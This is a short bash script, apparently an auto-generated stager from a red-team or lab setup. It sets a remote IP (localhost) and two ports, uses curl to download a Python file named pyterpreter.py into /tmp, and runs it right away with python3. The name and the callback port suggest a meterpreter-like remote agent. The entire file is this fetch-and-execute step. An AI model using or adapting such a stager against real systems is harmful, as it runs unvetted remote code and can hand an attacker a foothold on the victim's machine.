#!/bin/bash
export REMOTE_IP=localhost  # auto_generated
export REMOTE_PORT=50000
export RESOURCES_PORT=1338

curl $REMOTE_IP:$RESOURCES_PORT/pyterpreter.py > /tmp/pyterpreter.py
python3 /tmp/pyterpreter.py
